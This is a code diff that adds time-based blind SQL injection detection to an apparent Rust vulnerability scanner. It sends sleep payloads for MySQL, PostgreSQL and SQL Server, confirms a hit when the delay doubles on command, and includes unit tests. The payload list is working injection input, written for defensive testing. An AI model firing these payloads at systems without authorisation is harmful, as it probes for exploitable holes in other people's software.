@@ -14,7 +14,18 @@
 //! boolean-based: value' AND '1'='1   → answers like the original
 //!                value' AND '1'='2   → answers differently
 //!                The input is being concatenated into a condition the server evaluates.
+//!
+//! time-based:    value' AND SLEEP(2)   → the response takes ~2s longer
+//!                value' AND SLEEP(4)   → ~4s longer, so the wait tracks the number asked.
+//!                The blind case: nothing of the result shows, but the server waits.
 //! ```
+//!
+//! The time-based test is the one for a query whose result never reaches the response —
+//! no error, no content that tracks a condition. The only thing left to control is how
+//! long the server takes, and a delay that scales from `D` to `2D` on command is not
+//! network noise. Fast baseline samples keep a naturally slow endpoint from reading as a
+//! sleep, and it runs last because it is the slowest — each confirming probe waits out
+//! its own delay. Nothing here writes: `SLEEP`/`pg_sleep`/`WAITFOR DELAY` only wait.
 //!
 //! # It says "SQL injection", carefully
 //!
@@ -43,8 +54,18 @@ use nullhawk_types::verify::{
 };
 use nullhawk_types::Result;
 use nullhawk_verify::Lab;
+use std::time::Instant;
 
 use crate::{ActiveCheck, Budget, Subject};
+
+/// The shorter of the two injected delays, in seconds; the confirming probe asks for
+/// twice this. Two seconds is well clear of ordinary jitter and keeps the run's added
+/// wall-clock modest — a confirmed hit costs one D-second wait and one 2D-second wait.
+const DELAY_SECS: u64 = 2;
+
+/// Fast control samples taken before the sleep probes, so a naturally slow endpoint is
+/// told from an injected delay rather than mistaken for one.
+const BASELINE_SAMPLES: usize = 3;
 
 /// The check.
 pub struct SqlInjection;
@@ -55,7 +76,7 @@ const SETTLES: &str = "input.sqli";
 const INFO: DetectorInfo = DetectorInfo {
     id: DetectorId("input.sqli"),
     name: "SQL injection",
-    version: "1.0.0",
+    version: "1.1.0",
     about: "whether an input is concatenated into a SQL query — by the error an \
             unbalanced quote raises, or a boolean condition the response tracks",
     mode: DetectorMode::Active,
@@ -215,11 +236,26 @@ impl ActiveCheck for SqlInjection {
             }
         }
 
+        // ---- time-based blind ----
+        //
+        // The case neither error nor boolean catches: the query runs, the input reaches
+        // it, but nothing about the result — error, row count, content — shows in the
+        // response. The only thing left to control is *how long the server takes*. Inject
+        // a sleep, and if the response slows, confirm the delay tracks the number asked
+        // for — a coincidentally slow request does not scale from D to 2D on command.
+        //
+        // Last because it is the slowest: each confirming probe waits out its own delay.
+        if budget.per_hypothesis >= 4 {
+            if let Some(verdict) = time_based(subject, lab, &slot, &base, budget).await {
+                return Ok(verdict);
+            }
+        }
+
         Ok(Verification::Refuted {
             note: format!(
-                "no database error surfaced from an unbalanced quote in {}, and boolean \
-                 payloads did not change the response — this input shows no sign of \
-                 reaching a SQL query unsanitised",
+                "no database error surfaced from an unbalanced quote in {}, boolean \
+                 payloads did not change the response, and a sleep payload did not delay \
+                 it — this input shows no sign of reaching a SQL query unsanitised",
                 describe(&slot),
             ),
         })
@@ -324,6 +360,142 @@ async fn probe(subject: &Subject, lab: &dyn Lab, slot: &ObjectLocation, value: &
         status: response.status,
         body: response.body.to_vec(),
     })
+}
+
+/// Sends a probe and measures its round-trip time. The wall clock is taken around the
+/// send here, rather than read from the exchange, so what is measured is exactly what a
+/// time-based test cares about: how long the server held the request.
+async fn timed(
+    subject: &Subject,
+    lab: &dyn Lab,
+    slot: &ObjectLocation,
+    value: &str,
+) -> Option<(Answer, u64)> {
+    let mut draft = subject.draft.clone();
+    draft.request = substitute(&draft.request, slot, value).ok()?;
+    let started = Instant::now();
+    let sent = lab.experiment(&draft, None).await.ok()?;
+    let elapsed_ms = started.elapsed().as_millis() as u64;
+    let response = &sent.exchange.response;
+    Some((
+        Answer {
+            request: sent.id,
+            status: response.status,
+            body: response.body.to_vec(),
+        },
+        elapsed_ms,
+    ))
+}
+
+/// Sleep payloads by engine, at `secs` seconds. Both quoted string and bare numeric
+/// contexts, because the injection point is one or the other and the cost of trying the
+/// wrong one is a single fast request — a payload that does not parse, or parses in
+/// another engine's dialect, simply does not sleep.
+fn sleep_payloads(base: &str, secs: u64) -> Vec<(&'static str, String)> {
+    vec![
+        ("MySQL", format!("{base}' AND SLEEP({secs})-- -")),
+        ("MySQL", format!("{base}\" AND SLEEP({secs})-- -")),
+        ("MySQL", format!("{base} AND SLEEP({secs})")),
+        ("PostgreSQL", format!("{base}';SELECT pg_sleep({secs})-- -")),
+        (
+            "PostgreSQL",
+            format!("{base}' AND {secs}=(SELECT {secs} FROM PG_SLEEP({secs}))-- -"),
+        ),
+        (
+            "Microsoft SQL Server",
+            format!("{base}';WAITFOR DELAY '0:0:{secs}'-- -"),
+        ),
+        (
+            "Microsoft SQL Server",
+            format!("{base}' WAITFOR DELAY '0:0:{secs}'-- -"),
+        ),
+    ]
+}
+
+/// Whether a probe cleared the baseline by most of the delay it asked for — the bar a
+/// response has to pass to count as having slept at all. 0.6·D of slack absorbs jitter.
+fn slept(baseline_max: u64, t: u64, d_ms: u64) -> bool {
+    t >= baseline_max + (d_ms * 6) / 10
+}
+
+/// Whether the 2D probe added most of another D on top of the D probe — the tracking
+/// that separates an injected sleep from one request that happened to be slow.
+fn scales(t_short: u64, t_long: u64, d_ms: u64) -> bool {
+    t_long >= t_short + (d_ms * 5) / 10
+}
+
+/// The time-based blind experiment. Returns a verdict only when a sleep delayed the
+/// response *and* doubling the requested delay roughly doubled the wait — `None`
+/// otherwise, so the caller reports the honest refuted.
+async fn time_based(
+    subject: &Subject,
+    lab: &dyn Lab,
+    slot: &ObjectLocation,
+    base: &str,
+    budget: &Budget,
+) -> Option<Verification> {
+    // What an undisturbed request costs, sampled a few times. The slowest sample is the
+    // bar a delay has to clear, so ordinary variance is not read as a sleep.
+    let mut baseline_ms = Vec::new();
+    for _ in 0..BASELINE_SAMPLES {
+        if let Some((_, ms)) = timed(subject, lab, slot, base).await {
+            baseline_ms.push(ms);
+        }
+    }
+    let baseline_max = *baseline_ms.iter().max()?;
+    let d_ms = DELAY_SECS * 1000;
+
+    let short = sleep_payloads(base, DELAY_SECS);
+    let long = sleep_payloads(base, DELAY_SECS * 2);
+    let mut spent = 0usize;
+    for ((engine, pshort), (_, plong)) in short.iter().zip(long.iter()) {
+        // Each candidate costs at most two probes; stop before one the budget cannot pay
+        // for, counting generously since the slow probes are the expensive ones.
+        if spent + 2
+            > budget
+                .per_hypothesis
+                .saturating_sub(BASELINE_SAMPLES)
+                .max(2)
+        {
+            break;
+        }
+        let Some((_, t_short)) = timed(subject, lab, slot, pshort).await else {
+            continue;
+        };
+        spent += 1;
+        if !slept(baseline_max, t_short, d_ms) {
+            continue; // this dialect did not sleep — try the next
+        }
+        // Promising. Confirm the wait scales with the number asked for.
+        let Some((confirmed, t_long)) = timed(subject, lab, slot, plong).await else {
+            continue;
+        };
+        spent += 1;
+        if scales(t_short, t_long, d_ms) {
+            return Some(Verification::Reproduced {
+                note: format!(
+                    "{} delayed the response by about {} second(s) when told to sleep for \
+                     {DELAY_SECS}, and about twice that when told to sleep for {} — the \
+                     server waits for a {} sleep the input controls, though nothing of the \
+                     query's result reaches the response. This is a blind, time-based SQL \
+                     injection",
+                    describe(slot),
+                    (t_short.saturating_sub(baseline_max)) / 1000,
+                    DELAY_SECS * 2,
+                    engine,
+                ),
+                evidence: vec![
+                    from_exchange(subject),
+                    Evidence::Timing {
+                        request: confirmed.request,
+                        baseline_ms: baseline_ms.clone(),
+                        variant_ms: vec![t_short, t_long],
+                    },
+                ],
+            });
+        }
+    }
+    None
 }
 
 struct Signature {
@@ -561,5 +733,43 @@ mod tests {
         assert!(similar(&mk(200, 1000), &mk(200, 1010)));
         assert!(!similar(&mk(200, 1000), &mk(200, 4000)));
         assert!(!similar(&mk(200, 1000), &mk(500, 1000)));
+    }
+
+    #[test]
+    fn a_sleep_must_clear_the_baseline_by_most_of_the_delay() {
+        let d = DELAY_SECS * 1000; // 2000ms
+                                   // baseline 80ms; a 2s sleep lands near 2080ms — well clear.
+        assert!(slept(80, 2100, d));
+        // A request 300ms over baseline is jitter, not a 2s sleep.
+        assert!(!slept(80, 380, d));
+        // A slow endpoint (baseline 1900ms) is not itself a sleep.
+        assert!(!slept(1900, 2000, d));
+    }
+
+    #[test]
+    fn a_confirmed_injection_scales_from_d_to_two_d() {
+        let d = DELAY_SECS * 1000;
+        // D≈2.1s, 2D≈4.1s: the long probe added ~2s more, so it tracks.
+        assert!(scales(2100, 4100, d));
+        // A one-off slow D probe that does not grow at 2D is not an injection.
+        assert!(!scales(2100, 2200, d));
+    }
+
+    #[test]
+    fn the_sleep_payloads_cover_the_major_engines_and_both_contexts() {
+        let ps = sleep_payloads("x", 2);
+        let joined = ps
+            .iter()
+            .map(|(_, p)| p.as_str())
+            .collect::<Vec<_>>()
+            .join("\n");
+        assert!(joined.contains("SLEEP(2)"), "MySQL");
+        assert!(
+            joined.contains("pg_sleep(2)") || joined.contains("PG_SLEEP(2)"),
+            "Postgres"
+        );
+        assert!(joined.contains("WAITFOR DELAY '0:0:2'"), "MSSQL");
+        // A bare numeric context, not only quoted ones.
+        assert!(ps.iter().any(|(_, p)| p == "x AND SLEEP(2)"));
     }
 }
